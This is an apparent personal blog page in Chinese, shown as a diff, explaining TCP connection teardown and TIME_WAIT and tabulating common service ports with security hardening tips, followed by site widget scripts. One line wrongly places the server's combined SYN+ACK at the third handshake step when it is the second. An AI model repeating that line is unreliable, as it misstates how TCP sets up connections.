+<h4 id="关键设计逻辑为什么是-四次-而不是-三次">关键设计逻辑：为什么是 “四次” 而不是 “三次”？
+</h4><ul>
+<li><strong>核心原因</strong>：TCP 是全双工通信，双方的 “发送通道” 需要独立关闭。</li>
+<li>第三次握手时，服务器可以同时发送 SYN 和 ACK（因为此时服务器还未发送数据，可合并报文）；</li>
+<li>四次挥手时，服务器收到客户端的 FIN 后，可能仍有数据要发送，无法立即发送 FIN（需先完成数据传输），因此必须分两步：先回复 ACK（确认客户端关闭），再发送 FIN（自己关闭），导致比三次握手多一次报文交互。</li>
+</ul>
+<h4 id="关键细节time_wait-状态的作用">关键细节：TIME_WAIT 状态的作用
+</h4><ul>
+<li><strong>目的 1</strong>：确保最后一个 ACK 报文能到达服务器（若服务器未收到 ACK，会重发 FIN，客户端在 TIME_WAIT 期间可重新回复）；</li>
+<li><strong>目的 2</strong>：避免 “失效的报文段” 干扰新连接（TIME_WAIT 期间，客户端会丢弃所有来自该连接的旧报文段）；</li>
+<li><strong>实际影响</strong>：服务器若频繁关闭连接，会积累大量 TIME_WAIT 状态的端口，导致端口耗尽（可通过调整<code>net.ipv4.tcp_tw_reuse</code>等内核参数优化）。</li>
+</ul>
+<h2 id="端口">端口
+</h2><p>端口是计算机网络中用于区分不同服务/应用的逻辑地址（范围：0-65535），按用途可分为 <strong>知名端口（0-1023）</strong>、<strong>注册端口（1024-49151）</strong> 和 <strong>动态端口（49152-65535）</strong>。以下是开发者和日常使用中最常见的端口及其核心特点，按场景分类整理，方便查阅：</p>
+<h3 id="核心网络服务端口知名端口0-1023">核心网络服务端口（知名端口，0-1023）
+</h3><p>这类端口由 IANA 分配，对应基础网络服务，默认端口固定，是网络通信的基础。</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>端口号</th>
+          <th>协议</th>
+          <th>服务/应用</th>
+          <th>核心特点</th>
+          <th>使用场景</th>
+          <th>安全注意事项</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>21</td>
+          <td>TCP</td>
+          <td>FTP（文件传输）</td>
+          <td>明文传输用户名/密码和文件数据，不加密；主动模式（服务器连客户端20端口）/被动模式</td>
+          <td>传统文件传输（已逐渐被替代）</td>
+          <td>风险极高！明文传输易被窃听，建议用 <strong>SFTP（22端口）</strong> 或 <strong>FTPS</strong> 替代</td>
+      </tr>
+      <tr>
+          <td>22</td>
+          <td>TCP</td>
+          <td>SSH（安全外壳）</td>
+          <td>加密远程登录/命令执行，支持端口转发、文件传输（SFTP），替代Telnet</td>
+          <td>服务器远程管理（Linux/云服务器）</td>
+          <td>建议修改默认端口（如2222），禁用密码登录（仅用SSH密钥），限制登录IP</td>
+      </tr>
+      <tr>
+          <td>23</td>
+          <td>TCP</td>
+          <td>Telnet（远程登录）</td>
+          <td>明文传输，无加密，安全性极差</td>
+          <td>早期设备管理（已淘汰）</td>
+          <td>完全不推荐使用！用SSH（22端口）替代</td>
+      </tr>
+      <tr>
+          <td>25</td>
+          <td>TCP</td>
+          <td>SMTP（邮件发送）</td>
+          <td>用于邮件服务器之间发送邮件，或客户端向服务器提交邮件（需配合认证）</td>
+          <td>邮件服务（如Postfix、Sendmail）</td>
+          <td>默认无加密，建议开启TLS（465端口），配置SPF/DKIM防止邮件伪造</td>
+      </tr>
+      <tr>
+          <td>53</td>
+          <td>TCP/UDP</td>
+          <td>DNS（域名解析）</td>
+          <td>UDP用于普通查询（快，无连接）；TCP用于区域传输（数据量大，可靠）</td>
+          <td>域名解析（如访问网站、API）</td>
+          <td>开放公共DNS需注意防护DDoS攻击；内网建议部署本地DNS缓存（如Pi-hole）</td>
+      </tr>
+      <tr>
+          <td>80</td>
+          <td>TCP</td>
+          <td>HTTP（超文本传输）</td>
+          <td>明文传输网页数据，无加密，是Web服务默认端口</td>
+          <td>普通网站访问、HTTP API</td>
+          <td>仅用于测试/内部服务，公网必须升级为HTTPS（443端口），否则数据易被篡改窃听</td>
+      </tr>
+      <tr>
+          <td>443</td>
+          <td>TCP</td>
+          <td>HTTPS（加密HTTP）</td>
+          <td>基于TLS/SSL加密，保障数据传输安全，支持HTTP/2、HTTP/3</td>
+          <td>HTTPS网站、加密API、小程序</td>
+          <td>必须配置有效SSL证书（Let’s Encrypt免费），禁用弱加密套件（如TLS 1.0/1.1）</td>
+      </tr>
+      <tr>
+          <td>110</td>
+          <td>TCP</td>
+          <td>POP3（邮件接收）</td>
+          <td>明文接收邮件，无加密</td>
+          <td>客户端接收邮件（已淘汰）</td>
+          <td>用POP3S（995端口，加密）替代</td>
+      </tr>
+      <tr>
+          <td>143</td>
+          <td>TCP</td>
+          <td>IMAP（邮件接收）</td>
+          <td>支持邮件文件夹同步、标记管理，明文传输</td>
+          <td>客户端接收邮件（主流）</td>
+          <td>用IMAPS（993端口，加密）替代，开启邮件二次验证</td>
+      </tr>
+      <tr>
+          <td>389</td>
+          <td>TCP/UDP</td>
+          <td>LDAP（目录服务）</td>
+          <td>用于用户身份认证、组织架构管理（如企业内网）</td>
+          <td>企业内网身份验证</td>
+          <td>明文传输风险高，用LDAPS（636端口，加密）替代</td>
+      </tr>
+      <tr>
+          <td>445</td>
+          <td>TCP</td>
+          <td>SMB（文件共享）</td>
+          <td>Windows文件共享、打印机共享，支持跨设备访问</td>
+          <td>内网文件共享（Windows/Mac）</td>
+          <td>漏洞频发（如永恒之蓝），公网禁止开放；内网限制访问IP，关闭匿名登录</td>
+      </tr>
+  </tbody>
+</table></div>
+<h3 id="开发者常用端口注册端口1024-49151">开发者常用端口（注册端口，1024-49151）
+</h3><p>这类端口由应用程序注册使用，默认端口可配置修改，是开发、测试、部署中高频接触的端口。</p>
+<h4 id="数据库端口">数据库端口
+</h4><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>端口号</th>
+          <th>协议</th>
+          <th>数据库/服务</th>
+          <th>核心特点</th>
+          <th>使用场景</th>
+          <th>安全注意事项</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>3306</td>
+          <td>TCP</td>
+          <td>MySQL/MariaDB</td>
+          <td>关系型数据库默认端口，支持主从复制、事务</td>
+          <td>Web开发、数据分析</td>
+          <td>公网禁止开放！内网绑定本地IP（127.0.0.1），设置强密码，限制访问IP</td>
+      </tr>
+      <tr>
+          <td>5432</td>
+          <td>TCP</td>
+          <td>PostgreSQL</td>
+          <td>开源关系型数据库，支持复杂查询、JSON数据</td>
+          <td>后端开发、大数据应用</td>
+          <td>同MySQL，禁用远程匿名访问，开启SSL加密</td>
+      </tr>
+      <tr>
+          <td>1433</td>
+          <td>TCP</td>
+          <td>SQL Server</td>
+          <td>微软SQL Server数据库默认端口</td>
+          <td>.NET开发、企业应用</td>
+          <td>公网不开放，内网限制IP，启用Windows认证或混合认证</td>
+      </tr>
+      <tr>
+          <td>27017</td>
+          <td>TCP</td>
+          <td>MongoDB</td>
+          <td>文档型数据库，无Schema，支持分布式存储</td>
+          <td>大数据、API后端、NoSQL应用</td>
+          <td>默认无认证！需启用访问控制（用户名密码），绑定内网IP，禁止公网暴露</td>
+      </tr>
+      <tr>
+          <td>6379</td>
+          <td>TCP</td>
+          <td>Redis</td>
+          <td>内存缓存数据库，高性能，支持多种数据结构</td>
+          <td>缓存、会话存储、消息队列</td>
+          <td>高危！默认无密码，需设置密码、绑定本地IP、开启防火墙，禁用公网访问</td>
+      </tr>
+      <tr>
+          <td>9200</td>
+          <td>TCP</td>
+          <td>Elasticsearch</td>
+          <td>全文搜索引擎，支持分布式、实时检索</td>
+          <td>日志分析、全文搜索功能</td>
+          <td>禁用匿名访问，配置用户认证（如X-Pack），限制访问IP</td>
+      </tr>
+  </tbody>
+</table></div>
+<h4 id="web开发服务器端口">Web开发/服务器端口
+</h4><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>端口号</th>
+          <th>协议</th>
+          <th>服务/框架</th>
+          <th>核心特点</th>
+          <th>使用场景</th>
+          <th>安全注意事项</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>8080</td>
+          <td>TCP</td>
+          <td>通用Web端口</td>
+          <td>开发环境默认端口（如Tomcat、Nginx反向代理），非特权端口</td>
+          <td>本地开发测试、内网Web服务</td>
+          <td>公网部署需映射到80/443，禁止直接暴露8080；开启认证（如Basic Auth）</td>
+      </tr>
+      <tr>
+          <td>8000</td>
+          <td>TCP</td>
+          <td>开发服务器</td>
+          <td>Python Flask/Django、Node.js默认开发端口</td>
+          <td>本地开发调试（如<code>python manage.py runserver</code>）</td>
+          <td>仅用于本地测试，切勿公网开放（无安全防护）</td>
+      </tr>
+      <tr>
+          <td>3000</td>
+          <td>TCP</td>
+          <td>Node.js/React</td>
+          <td>Node.js Express、React开发服务器默认端口</td>
+          <td>前端/Node.js后端开发</td>
+          <td>同8000，本地测试专用，公网需通过Nginx反向代理并配置HTTPS</td>
+      </tr>
+      <tr>
+          <td>4000</td>
+          <td>TCP</td>
+          <td>Hugo/Gatsby</td>
+          <td>Hugo开发服务器默认端口（<code>hugo server -p 4000</code>）</td>
+          <td>静态博客本地预览（如GitHub Pages博客）</td>
+          <td>仅本地使用，无需公网开放，预览后部署到GitHub Pages（80/443端口）</td>
+      </tr>
+      <tr>
+          <td>8096</td>
+          <td>TCP</td>
+          <td>Jellyfin</td>
+          <td>媒体服务器默认端口（Web管理界面+流媒体传输）</td>
+          <td>云/内网媒体库（如之前提到的Jellyfin）</td>
+          <td>公网访问需配置HTTPS（反向代理+SSL），设置强密码，限制登录IP</td>
+      </tr>
+      <tr>
+          <td>8888</td>
+          <td>TCP</td>
+          <td>Jupyter Notebook</td>
+          <td>Python交互式开发环境默认端口</td>
+          <td>数据分析、机器学习开发</td>
+          <td>本地使用需设置密码（<code>jupyter notebook password</code>），公网需端口转发+HTTPS</td>
+      </tr>
+  </tbody>
+</table></div>
+<h4 id="其他开发工具端口">其他开发工具端口
+</h4><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>端口号</th>
+          <th>协议</th>
+          <th>工具/服务</th>
+          <th>核心特点</th>
+          <th>使用场景</th>
+          <th>安全注意事项</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>5900</td>
+          <td>TCP</td>
+          <td>VNC（远程桌面）</td>
+          <td>跨平台远程桌面控制，支持图形界面</td>
+          <td>远程操作桌面（如树莓派）</td>
+          <td>默认无加密，需开启VNC加密（如TightVNC），设置强密码，限制访问IP</td>
+      </tr>
+      <tr>
+          <td>3389</td>
+          <td>TCP</td>
+          <td>RDP（Windows远程桌面）</td>
+          <td>Windows自带远程桌面，图形界面流畅</td>
+          <td>Windows服务器/电脑远程控制</td>
+          <td>公网禁止开放！内网限制IP，开启网络级别认证（NLA），设置复杂密码</td>
+      </tr>
+      <tr>
+          <td>6000-6005</td>
+          <td>TCP</td>
+          <td>X11（Linux图形界面）</td>
+          <td>Linux/Unix图形界面传输端口</td>
+          <td>Linux远程图形界面访问</td>
+          <td>明文传输，风险高，建议用SSH隧道转发（<code>ssh -X user@server</code>）替代</td>
+      </tr>
+      <tr>
+          <td>9090</td>
+          <td>TCP</td>
+          <td>Prometheus</td>
+          <td>监控系统默认端口（Web UI+API）</td>
+          <td>服务器/应用监控</td>
+          <td>公网需配置认证（如Basic Auth），限制访问IP，配合Grafana（3000端口）可视化</td>
+      </tr>
+  </tbody>
+</table></div>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+<div class="math-katex"></div>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+        <div class="comment-container mt-8"></div>
+        
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="makabaka11/makabaka11.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Retr0
+    </section>
+    
+    <section class="powerby">
+        
+            Powered by ctOS <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+
+                <script src="/js/APlayer.min.js"></script>
+                <script src="/js/Meting.min.js"></script>
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eaf1211e4c7db355f37ceea53df13700e1b77fbcc3cfe8c1c1f69e4468a752e1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<script>
+    var pjax = new Pjax({
+        selectors: [".main-container"]
+    });
+</script>
+
+
+<script src=https://www.retr0.qzz.io/js/topbar.min.js></script>
+
+
+
+<script>
+function initUtterances() {
+    const isArticle = document.querySelector('.article-page') && document.querySelector('.article-content');
+    if (!isArticle) return;
+
+    const oldScript = document.querySelector('script[src^="https://utteranc.es/client.js"]');
+    if (oldScript) oldScript.remove();
+
+    const container = document.querySelector('.comment-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    let script = document.createElement('script');
+    script.src = 'https://utteranc.es/client.js';
+    script.setAttribute('repo', 'makabaka11/makabaka11.github.io');
+    script.setAttribute('issue-term', 'pathname');
+    script.setAttribute('crossorigin', 'anonymous');
+    script.async = true;
+    container.appendChild(script);
+}
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    if (!window.pjax || !window.pjax.state) initUtterances();
+});
+</script>
+
+
+<script>
+pjax._handleResponse = pjax.handleResponse;
+pjax.handleResponse = function(responseText, request, href, options) {
+    if (request.responseText.match("<html")) {
+        if (responseText) {
+            let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+            document.body.setAttribute("class", newDom.body.className);
+        }
+        pjax._handleResponse(responseText, request, href, options);
+    }
+};
+</script>
+
+
+<script>
+topbar.config({
+    barColors: {
+        '0': 'rgba(255, 255, 255, 1)',
+        '1.0': 'rgba(255, 183, 197, 1)'
+    }
+});
+
+document.addEventListener('pjax:send', () => topbar.show());
+
+document.addEventListener('pjax:complete', () => {
+    window.Stack.init();
+    topbar.hide();
+    setTimeout(initUtterances, 0);
+    updateViewCount();
+    renderKaTeX();
+    initPhotoSwipeFromDOM('.article-content');   
+    initLive2D();                                
+});
+</script>
+
+
+<script>
+function updateViewCount() {
+    const viewCountEl = document.getElementById('vercount_value_page_pv');
+    if (!viewCountEl) return;
+
+    viewCountEl.textContent = 'loading...';
+    const url = 'https://cn.vercount.one/js';
+
+    const old = document.querySelector(`script[src="${url}"]`);
+    if (old) old.remove();
+
+    const s = document.createElement('script');
+    s.src = url;
+    s.defer = true;
+    document.head.appendChild(s);
+
+    showHideView();
+}
+
+function showHideView() {
+    const viewCounts = document.querySelectorAll("#viewCount");
+    const isArticle = document.querySelector(".article-page");
+    viewCounts.forEach(ele => ele.style.display = isArticle ? 'block' : 'none');
+}
+</script>
+
+
+<script>
+async function renderKaTeX() {
+    let katex = document.querySelector(".math-katex");
+    if (!katex) return;
+
+    while (typeof renderMathInElement !== 'function') {
+        await new Promise(r => setTimeout(r, 500));
+    }
+
+    const content = document.querySelector('.article-content') || document.body;
+    renderMathInElement(content, {
+        delimiters: [
+            { left: "$$", right: "$$", display: true },
+            { left: "$", right: "$", display: false },
+            { left: "\\(", right: "\\)", display: false },
+            { left: "\\[", right: "\\]", display: true }
+        ],
+        ignoredClasses: ["gist"]
+    });
+}
+</script>
+
+
+<div id="particles-js"></div>
+
+<script src=https://www.retr0.qzz.io/background/particles.min.js></script>
+<script>
+particlesJS.load('particles-js',
+    "https://www.retr0.qzz.io/background/particlesjs-config.json",
+    () => console.log('particles.js loaded')
+);
+</script>
+
+<style>
+#particles-js {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    z-index: -1;
+}
+</style>
+
+<script>
+
+function initPhotoSwipeFromDOM(selector) {
+    if (!window.PhotoSwipe) return;
+
+    const containers = document.querySelectorAll(selector);
+    if (!containers.length) return;
+
+    containers.forEach(container => {
+        const images = container.querySelectorAll('img');
+
+        images.forEach((img, index) => {
+
+            
+            function getImageSize() {
+                return new Promise(resolve => {
+                    if (img.complete && img.naturalWidth) {
+                        resolve({
+                            w: img.naturalWidth,
+                            h: img.naturalHeight
+                        });
+                    } else {
+                        const tmp = new Image();
+                        tmp.src = img.src || img.getAttribute("data-src");
+                        tmp.onload = () => resolve({ w: tmp.width, h: tmp.height });
+                    }
+                });
+            }
+
+            img.style.cursor = "zoom-in";
+
+            
+            img.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const size = await getImageSize();
+                const pswpEl = document.querySelector('.pswp');
+
+                const items = Array.from(images).map(i => ({
+                    src: i.src || i.getAttribute("data-src"),
+                    msrc: i.src,
+                    w: i.naturalWidth || 800,
+                    h: i.naturalHeight || 600,
+                }));
+
+                items[index].w = size.w;
+                items[index].h = size.h;
+
+                const gallery = new PhotoSwipe(pswpEl, PhotoSwipeUI_Default, items, {
+                    index,
+                    history: false
+                });
+
+                
+                
+                
+                enablePhotoSwipeWebShare(gallery);
+
+                gallery.init();
+            });
+        });
+    });
+}
+
+
+
+
+
+function enablePhotoSwipeWebShare(gallery) {
+    gallery.listen('shareLinkClick', function(shareButtonData, e) {
+        e.preventDefault();
+
+        const item = gallery.currItem;
+
+        if (navigator.share) {
+            navigator.share({
+                title: document.title,
+                text: '给你分享一张图片：',
+                url: item.src
+            }).catch(err => console.log("分享失败：", err));
+
+            return false; 
+        }
+
+        
+        return true;
+    });
+}
+</script>
+
+
+
+<script>
+function initLive2D() {
+    if (screen.width < 768) return;
+
+    const cdnPath = "https://www.retr0.qzz.io/blog-live2d/";
+    const config = {
+        path: {
+            modelPath: cdnPath + "Resources/",
+            cssPath: cdnPath + "waifu.css",
+            tipsJsonPath: cdnPath + "waifu-tips.json",
+            tipsJsPath: cdnPath + "waifu-tips.js",
+            live2dCorePath: cdnPath + "Core/live2dcubismcore.js",
+            live2dSdkPath: cdnPath + "live2d-sdk.js"
+        }
+    };
+
+    Promise.all([
+        loadRes(config.path.cssPath, "css"),
+        loadRes(config.path.live2dCorePath, "js"),
+        loadRes(config.path.live2dSdkPath, "js"),
+        loadRes(config.path.tipsJsPath, "js")
+    ]).then(() => {
+        initWidget({
+            waifuPath: config.path.tipsJsonPath,
+            cdnPath: config.path.modelPath
+        });
+    });
+}
+
+function loadRes(url, type) {
+    return new Promise((resolve) => {
+        const tag = type === "css" ? document.createElement("link") : document.createElement("script");
+        if (type === "css") {
+            tag.rel = "stylesheet";
+            tag.href = url;
+        } else {
+            tag.src = url;
+        }
+        tag.onload = resolve;
+        document.head.appendChild(tag);
+    });
+}
+
+initLive2D();
+</script>
+
+
+        
+
+<meting-js
+  server="netease"
+  type="playlist"
+  id="14477349320"
+  fixed="true"
+  bottom="20px"
+  right="20px"
+  autoplay="false"
+  width="300px"
+></meting-js>
+
+
+<script>
+  let apInstance = null;
+  const currentPlaylistId = "14477349320";
+  const STORAGE_KEY = "playInfo";
+
+  
+  const checkInstanceInterval = setInterval(() => {
+    const aplayerElement = document.querySelector('.aplayer');
+    if (aplayerElement && aplayerElement.aplayer) {
+      apInstance = aplayerElement.aplayer;
+      clearInterval(checkInstanceInterval);
+      console.log("Hugo 中获取 APlayer 实例成功");
+      initPlayerEvents();
+      return;
+    }
+
+    if (window.APlayer && window.APlayer.instances && window.APlayer.instances.length > 0) {
+      apInstance = window.APlayer.instances[0];
+      clearInterval(checkInstanceInterval);
+      console.log("从全局列表获取实例");
+      initPlayerEvents();
+      return;
+    }
+
+    console.log("Hugo 中等待 APlayer 实例...");
+  }, 300);
+
+  function initPlayerEvents() {
+    if (!apInstance) return;
+
+    
+    window.addEventListener('beforeunload', savePlayState);
+    document.addEventListener('visibilitychange', savePlayState);
+
+    
+    apInstance.on('list:loaded', restorePlayState);
+  }
+
+  function savePlayState() {
+    if (!apInstance) return;
+    const playInfo = {
+      playlistId: currentPlaylistId,
+      index: apInstance.list.index,
+      currentTime: apInstance.audio.currentTime,
+      paused: apInstance.paused
+    };
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(playInfo));
+  }
+
+  function restorePlayState() {
+    const savedInfo = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (!savedInfo || savedInfo.playlistId !== currentPlaylistId) return;
+
+    if (savedInfo.index < apInstance.list.songs.length) {
+      apInstance.list.switch(savedInfo.index);
+      apInstance.once('canplay', () => {
+        apInstance.seek(savedInfo.currentTime);
+        if (!savedInfo.paused) {
+          apInstance.play().catch(() => {
+            apInstance.notice("点击继续播放", 3000);
+          });
+        }
+      });
+    }
+  }
+
+  
+  document.addEventListener('click', () => {
+    if (apInstance && !apInstance.paused) {
+      apInstance.play().catch(() => {});
+    }
+  }, { once: true });
+</script>
+    </body>
+</html>
